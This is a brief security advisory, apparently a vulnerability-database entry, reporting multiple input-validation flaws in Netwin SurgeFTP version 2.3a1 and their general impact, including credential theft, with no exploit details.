Netwin SurgeFTP is prone to multiple input-validation vulnerabilities because it fails to sanitize user-supplied input.

A successful exploit of these vulnerabilities could allow an attacker to compromise the application, access or modify data, and steal cookie-based authentication credentials. Other attacks are also possible.

Version 2.3a1 is vulnerable to these issues; others versions may also be affected.
